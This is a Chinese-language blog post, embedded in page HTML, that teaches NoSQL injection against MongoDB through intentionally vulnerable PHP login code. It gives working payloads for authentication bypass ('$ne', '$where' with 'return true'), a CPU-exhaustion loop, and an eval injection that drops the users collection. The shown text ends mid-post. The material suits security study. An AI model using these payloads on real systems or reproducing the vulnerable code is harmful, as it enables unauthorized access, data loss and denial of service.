@@ -1,0 +1,594 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>NOSQL | upload</title><meta name="author" content="upload"><meta name="copyright" content="upload"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="Welcome to my blog 😁😁😁😁">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NOSQL">
+<meta property="og:url" content="http://upload.love/2021/04/20/NOSQL/index.html">
+<meta property="og:site_name" content="upload">
+<meta property="og:description" content="Welcome to my blog 😁😁😁😁">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://upload.love/image/buu.png">
+<meta property="article:published_time" content="2021-04-20T07:55:13.000Z">
+<meta property="article:modified_time" content="2021-08-06T16:09:22.000Z">
+<meta property="article:author" content="upload">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://upload.love/image/buu.png"><link rel="shortcut icon" href="/%E7%94%B7%E5%AD%A9.png"><link rel="canonical" href="http://upload.love/2021/04/20/NOSQL/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-08-07 00:09:22'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'true'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="upload" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">196</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">136</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/2.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">upload</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">NOSQL</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-04-20T07:55:13.000Z" title="发表于 2021-04-20 15:55:13">2021-04-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-08-06T16:09:22.000Z" title="更新于 2021-08-07 00:09:22">2021-08-07</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>20分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><a target="_blank" rel="noopener" href="https://x3fwy.bitcron.com/post/nosqlinjection">大佬</a></p>
+<h2 id="研究起因"><a href="#研究起因" class="headerlink" title="研究起因"></a>研究起因</h2><p>接触NoSQL已经近两年了，最近在研究NoSQL注入，于是写下这篇文章输出我的一些沉淀。真正开始了解NoSQL注入的时候才发现这方面的文章少之又少，中文的更是凤毛麟角了，而且很多论文和代码中用到的MongoDB driver版本已经很老且不推荐使用了，我先去乌云镜像站搜一下MongoDB相关的漏洞，大约300多条记录，绝大多数是未授权访问的，NoSQL注入只有寥寥几个，随后又向一些常刷SRC的榜上有名的白帽子们了解了下，得到的答案都差不多是不搞NoSQL。这就更激发我想写出点东西帮助更多人了解NoSQL注入。</p>
+<p>镜像站参考链接：<a target="_blank" rel="noopener" href="https://wooyun.shuimugan.com/">https://wooyun.shuimugan.com/</a></p>
+<p>文章均用我最熟悉的MongoDB作为例子。</p>
+<h2 id="一点NoSQL注入的概念"><a href="#一点NoSQL注入的概念" class="headerlink" title="一点NoSQL注入的概念"></a>一点NoSQL注入的概念</h2><p>来看下owasp对NoSQL注入的描述</p>
+<p>NoSQL数据库提供比传统SQL数据库更宽松的一致性限制。 通过减少关系约束和一致性检查，NoSQL数据库提供了更好的性能和扩展性。 然而，即使这些数据库没有使用传统的SQL语法，它们仍然可能很容易的受到注入攻击。 由于这些NoSQL注入攻击可以在程序语言中执行，而不是在声明式 SQL语言中执行，所以潜在影响要大于传统SQL注入。</p>
+<p>NoSQL数据库的调用是使用应用程序的编程语言编写的，过滤掉常见的HTML特殊字符，如&lt;&gt;＆;不会阻止针对NoSQL的攻击。</p>
+<h2 id="NoSQL注入分类"><a href="#NoSQL注入分类" class="headerlink" title="NoSQL注入分类"></a>NoSQL注入分类</h2><p>我找到了两种NoSQL注入分类的分类方式，第一种是按照语言的分类:PHP数组注入，js注入和mongo shell拼接注入等等。</p>
+<p>第二种是按照攻击机制分类:重言式，联合查询，JavaScript注入等等，这种分类方式很像SQL注入的分类方式。</p>
+<p>我们详细讨论下第二种分类方式:<br><strong>1) 重言式</strong></p>
+<p>又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p>
+<p><strong>2) 联合查询</strong></p>
+<p>联合查询是一种众所周知的SQL注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。</p>
+<p><strong>3) JavaScript注入</strong></p>
+<p>这是一种新的漏洞，由允许执行数据内容中JavaScript的NoSQL数据库引入的。JavaScript使在数据引擎进行复杂事务和查询成为可能。传递不干净的用户输入到这些查询中可以注入任意JavaScript代码，这会导致非法的数据获取或篡改。</p>
+<h2 id="PHP中的NoSQL注入"><a href="#PHP中的NoSQL注入" class="headerlink" title="PHP中的NoSQL注入"></a>PHP中的NoSQL注入</h2><p>在我搜集NoSQL注入的时候发现了一个叫<a target="_blank" rel="noopener" href="https://github.com/youngyangyang04/NoSQLInjectionAttackDemo">NoSQLInjectionAttackDemo</a>的Github repo，感谢前辈的辛苦研究，给我提供了很宝贵的资料，我基于这个项目分析PHP中的NoSQL注入。</p>
+<h3 id="重言式注入"><a href="#重言式注入" class="headerlink" title="重言式注入"></a>重言式注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $m &#x3D; new MongoClient();</span><br><span class="line">   $db &#x3D; $m-&gt;test;</span><br><span class="line">   $collection &#x3D; $db-&gt;users;</span><br><span class="line">   $dbUsername &#x3D; null;</span><br><span class="line">   $dbPassword &#x3D; null;</span><br><span class="line">   $data &#x3D; array(</span><br><span class="line">        &#39;username&#39; &#x3D;&gt;  $_REQUEST[&#39;username&#39;],</span><br><span class="line">        &#39;password&#39; &#x3D;&gt;  $_REQUEST[&#39;password&#39;]</span><br><span class="line">        </span><br><span class="line">   ); </span><br><span class="line">   $cursor &#x3D; $collection-&gt;find($data);</span><br><span class="line">   $count &#x3D; $cursor-&gt;count();</span><br><span class="line">   $doc_failed &#x3D; new DOMDocument();</span><br><span class="line">   $doc_failed-&gt;loadHTMLFile(&quot;failed.html&quot;);</span><br><span class="line">   $doc_succeed &#x3D; new DOMDocument();</span><br><span class="line">   $doc_succeed-&gt;loadHTMLFile(&quot;succeed.html&quot;);</span><br><span class="line">   if($count &gt;0 )&#123;</span><br><span class="line">    echo $doc_succeed-&gt;saveHTML();</span><br><span class="line">    foreach ($cursor as $user)&#123;</span><br><span class="line">            echo &#39;username:&#39;.$user[&#39;username&#39;].&quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &#39;password:&#39;.$user[&#39;password&#39;].&quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   else&#123;</span><br><span class="line">    echo $doc_failed-&gt;saveHTML();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码有点年代，我试图运行的时候发现，这个MongoDB driver已经不推荐使用了。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/2017-12-18-15-39-15.jpg" alt="img"></p>
+<p>为了文章的实用性，我用最新的MongoDB driver重构了这段代码。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $manager &#x3D;  new MongoDB\Driver\Manager(&quot;mongodb:&#x2F;&#x2F;mongo:27017&quot;);</span><br><span class="line">   $dbUsername &#x3D; null;</span><br><span class="line">   $dbPassword &#x3D; null;</span><br><span class="line">   $data &#x3D; array(</span><br><span class="line">        &#39;username&#39; &#x3D;&gt;  $_REQUEST[&#39;username&#39;],</span><br><span class="line">        &#39;password&#39; &#x3D;&gt;  $_REQUEST[&#39;password&#39;]</span><br><span class="line">        </span><br><span class="line">   ); </span><br><span class="line">   $query &#x3D; new MongoDB\Driver\Query($data);</span><br><span class="line">   $cursor &#x3D; $manager-&gt;executeQuery(&#39;test.users&#39;, $query)-&gt;toArray();</span><br><span class="line">   $doc_failed &#x3D; new DOMDocument();</span><br><span class="line">   $doc_failed-&gt;loadHTMLFile(&quot;failed.html&quot;);</span><br><span class="line">   $doc_succeed &#x3D; new DOMDocument();</span><br><span class="line">   $doc_succeed-&gt;loadHTMLFile(&quot;succeed.html&quot;);</span><br><span class="line">   if(count($cursor)&gt;0)&#123;</span><br><span class="line">    echo $doc_succeed-&gt;saveHTML();</span><br><span class="line">   &#125;</span><br><span class="line">   else&#123;</span><br><span class="line">    echo $doc_failed-&gt;saveHTML();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>很简单，就是一个登录的后端处理代码，正常情况下，输入正确的用户名和密码我们可以看到登录成功的页面，输入错误的看到登录失败的页面。</p>
+<p>我们正常登录来详细看一下程序的数据流，假设用户名:xiaoming 密码:xiaoming123</p>
+<table>
+<thead>
+<tr>
+<th align="left">位置</th>
+<th align="left">数据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/2018-01-27-14-26-46.png" alt="img"></td>
+<td align="left"><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/2017-12-18-15-48-27.jpg" alt="img"></td>
+</tr>
+<tr>
+<td align="left"><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/http.png" alt="img"></td>
+<td align="left"><code>username=xiaoming&amp;password=xiaoming123</code></td>
+</tr>
+<tr>
+<td align="left"><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/2018-01-27-14-33-24.png" alt="img"></td>
+<td align="left"><code>$data = array(        &quot;username&quot; =&gt; &quot;xiaoming&quot;,        &quot;password&quot; =&gt; &quot;xiaoming123&quot;   );  </code></td>
+</tr>
+<tr>
+<td align="left"><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/2018-01-27-15-48-05.png" alt="img"></td>
+<td align="left"><code>db.users.find(    &#123;       &quot;username&quot;:&quot;xiaoming&quot;,       &quot;password&quot;:&quot;xiaoming123&quot;        &#125; ) </code></td>
+</tr>
+</tbody></table>
+<p>我们从代码中可以看出，这里对用户输入没有做任何校验，那么我们可以通过构造一个永真的条件就可以完成NoSQL注入。MongoDB基础我在本文不再赘述，直接构造payload:<code>username[$ne]=1&amp;password[$ne]=1</code>的payload。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/nosqldemo5-2.gif" alt="img"></p>
+<p>注入成功，看数据流:</p>
+<table>
+<thead>
+<tr>
+<th align="left">位置</th>
+<th align="left">数据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/2018-01-27-14-26-46.png" alt="img"></td>
+<td align="left"><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/2017-12-18-15-48-27.jpg" alt="img"></td>
+</tr>
+<tr>
+<td align="left"><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/http.png" alt="img"></td>
+<td align="left"><code>username[$ne]=1&amp;password[$ne]=1</code></td>
+</tr>
+<tr>
+<td align="left"><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/2018-01-27-14-33-24.png" alt="img"></td>
+<td align="left"><code>$data = array(        &quot;username&quot; =&gt; array(&quot;$ne&quot; =&gt; 1),        &quot;password&quot; =&gt; array(&quot;$ne&quot; =&gt; 1)   );  </code></td>
+</tr>
+<tr>
+<td align="left"><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/2018-01-27-15-48-05.png" alt="img"></td>
+<td align="left"><code>db.users.find(    &#123;       &quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,       &quot;password&quot;:&#123;&quot;$ne&quot;:1&#125;        &#125; ) </code></td>
+</tr>
+</tbody></table>
+<p>对于PHP本身的特性而言，由于其松散的数组特性，导致如果我们输入<code>value=1</code>那么，也就是输入了一个value的值为1的数据。如果输入<code>value[$ne]=1</code>也就意味着<code>value=array($ne=&gt;1)</code>,在MongoDB中，原来的一个单个目标的查询变成了条件查询。同样的，我们也可以使用<code>username[$gt]=&amp;password[$gt]=</code>作为payload进行攻击。</p>
+<h3 id="NoSQL联合查询注入"><a href="#NoSQL联合查询注入" class="headerlink" title="NoSQL联合查询注入"></a>NoSQL联合查询注入</h3><p>我们都知道在SQL时代拼接字符串容易造成SQL注入，NoSQL也有类似问题，但是现在无论是PHP的MongoDB driver还是node.js的mongoose都必须要求查询条件必须是一个数组或者对象了，因此简单看一下就好。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string query &#x3D;&quot;&#123; username: &#39;&quot; + post_username + &quot;&#39;, password: &#39;&quot; + post_password + &quot;&#39; &#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;tolkien&#39;, $or: [ &#123;&#125;, &#123; &#39;a&#39;:&#39;a&amp;password&#x3D;&#39; &#125; ]</span><br></pre></td></tr></table></figure>
+
+<h3 id="JavaScript注入"><a href="#JavaScript注入" class="headerlink" title="JavaScript注入"></a>JavaScript注入</h3><ul>
+<li>$where操作符</li>
+</ul>
+<p>在MongoDB中 $where操作符是可以执行JavaScript语句的,在MongoDB 2.4之前，通过$where操作符使用<code>map-reduce</code>、<code>group</code>命令可以访问到mongo shell中的全局函数和属性，如<code>db</code>，看到这里，如果你有在生产环境中使用MongoDB 2.4之前的MongoDB版本，赶快放下手里的事情去升级吧。</p>
+<p>我们继续用代码说话，后面的代码我将直接使用新版MongoDB driver作为示例。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$manager &#x3D;  new MongoDB\Driver\Manager(&quot;mongodb:&#x2F;&#x2F;mongo:27017&quot;);</span><br><span class="line">  $query_body &#x3D;array(</span><br><span class="line">        &#39;$where&#39;&#x3D;&gt;&quot;</span><br><span class="line">        function q() &#123;</span><br><span class="line">            var username &#x3D; &quot;.$_REQUEST[&quot;username&quot;].&quot;;</span><br><span class="line">            var password &#x3D; &quot;.$_REQUEST[&quot;password&quot;].&quot;;if(username &#x3D;&#x3D; &#39;admin&#39;&amp;&amp;password &#x3D;&#x3D; &#39;123456&#39;) return true; else&#123; return false;&#125;&#125;</span><br><span class="line">&quot;);  </span><br><span class="line">$query &#x3D; new MongoDB\Driver\Query($query_body);</span><br><span class="line">$cursor &#x3D; $manager-&gt;executeQuery(&#39;test.users&#39;, $query)-&gt;toArray();</span><br><span class="line">$doc_failed &#x3D; new DOMDocument();</span><br><span class="line">$doc_failed-&gt;loadHTMLFile(&quot;failed.html&quot;);</span><br><span class="line">$doc_succeed &#x3D; new DOMDocument();</span><br><span class="line">$doc_succeed-&gt;loadHTMLFile(&quot;succeed.html&quot;);</span><br><span class="line">if(count($cursor)&gt;0)&#123;</span><br><span class="line">    echo $doc_succeed-&gt;saveHTML();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo $doc_failed-&gt;saveHTML();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还是那个简单的登录，这次我们指定了用户名和密码，假设我们不知道用户名和密码，使用payload<code>username=1&amp;password=1;return true;</code>进行注入攻击。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/nosqldemo6.gif" alt="img"></p>
+<p>注入成功，继续看数据流:</p>
+<table>
+<thead>
+<tr>
+<th align="left">位置</th>
+<th align="left">数据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/2018-01-27-14-26-46.png" alt="img"></td>
+<td align="left"><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/2017-12-18-15-48-27.jpg" alt="img"></td>
+</tr>
+<tr>
+<td align="left"><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/http.png" alt="img"></td>
+<td align="left"><code>username=1&amp;password=1;return true;</code></td>
+</tr>
+<tr>
+<td align="left"><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/2018-01-27-14-33-24.png" alt="img"></td>
+<td align="left"><code>$query_body =array(    &#39;$where&#39;=&gt;&quot;    function q() &#123;      var username = 1;      var password = 1;return true;;      if(username == &#39;admin&#39;&amp;&amp;password == &#39;123456&#39;)       return true; else&#123; return false;&#125;&#125; &quot;);   </code></td>
+</tr>
+<tr>
+<td align="left"><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/2018-01-27-15-48-05.png" alt="img"></td>
+<td align="left"><code>db.users.find(  &#123;     $where:&quot;function q() &#123;var username = 1;&quot;+      &quot;var password = 1;return true;;if(username == &#39;admin&#39;&amp;&amp;password == &#39;123456&#39;) &quot;+      &quot;return true; else&#123; return false;&#125;&#125;&quot;     &#125; ) </code></td>
+</tr>
+</tbody></table>
+<p>对于这个$where操作符注入还有一个好玩的payload 。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;1&amp;password&#x3D;1;(function()&#123;var%20date%20&#x3D;%20new%20Date();%20do&#123;curDate%20&#x3D;%20new%20Date();&#125;while(curDate-date%3C5000);%20return%20Math.max();&#125;)();</span><br></pre></td></tr></table></figure>
+
+<p>这个payload可以让MongoDB所在服务器CPU瞬间飙升，持续5秒。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://x3fwy.bitcron.com/_image/yanshi.gif" alt="img"></p>
+<blockquote>
+<p>注意docker进程的cpu占用变化</p>
+</blockquote>
+<ul>
+<li>使用Command方法构成注入</li>
+</ul>
+<p>MongoDB driver一般都提供直接执行shell命令的方法，这些方式一般是不推荐使用的，但难免有人为了实现一些复杂的查询去使用，在php官网中就已经友情提醒了不要这样使用:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$m &#x3D; new MongoDB\Driver\Manager;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Don&#39;t do this!!!</span><br><span class="line">$username &#x3D; $_GET[&#39;field&#39;]; </span><br><span class="line">&#x2F;&#x2F; $username is set to &quot;&#39;); db.users.drop(); print(&#39;&quot;</span><br><span class="line"></span><br><span class="line">$cmd &#x3D; new \MongoDB\Driver\Command( [</span><br><span class="line">    &#39;eval&#39; &#x3D;&gt; &quot;print(&#39;Hello, $username!&#39;);&quot;</span><br><span class="line">] );</span><br><span class="line"></span><br><span class="line">$r &#x3D; $m-&gt;executeCommand( &#39;dramio&#39;, $cmd );</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>但是我实在不知道有人会用print干什么，(为了记日志？)继续搜索，直到我看到了有人喜欢用Command去实现Mongo的<code>distinct</code>方法，于是照猫画虎构建了这样的例子。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$manager &#x3D;  new MongoDB\Driver\Manager(&quot;mongodb:&#x2F;&#x2F;mongo:27017&quot;);</span><br><span class="line">$username &#x3D; $_REQUEST[&#39;username&#39;];</span><br><span class="line">$cmd &#x3D; new MongoDB\Driver\Command([</span><br><span class="line">  &#x2F;&#x2F; build the &#39;distinct&#39; command</span><br><span class="line">  &#39;eval&#39;&#x3D;&gt; &quot;db.users.distinct(&#39;username&#39;,&#123;&#39;username&#39;:&#39;$username&#39;&#125;)&quot;</span><br><span class="line">]);</span><br><span class="line">$cursor &#x3D; $manager-&gt;executeCommand(&#39;test&#39;, $cmd)-&gt;toArray();</span><br><span class="line">var_dump($cursor);</span><br><span class="line">$doc_failed &#x3D; new DOMDocument();</span><br><span class="line">$doc_failed-&gt;loadHTMLFile(&quot;failed.html&quot;);</span><br><span class="line">$doc_succeed &#x3D; new DOMDocument();</span><br><span class="line">$doc_succeed-&gt;loadHTMLFile(&quot;succeed.html&quot;);</span><br><span class="line">if(count($cursor)&gt;0)&#123;</span><br><span class="line">    echo $doc_succeed-&gt;saveHTML();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo $doc_failed-&gt;saveHTML();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个就危险太多了，因为这个就相当于把mongo shell开放给用户了，你基本可以构建任何mongo shell可以执行的payload了，如果当前应用连接数据库的权限恰好很高，我们能干的事情更多。如构建payload:<code>username=2&#39;&#125;);db.users.drop();db.user.find(&#123;&#39;username&#39;:&#39;2</code></p>
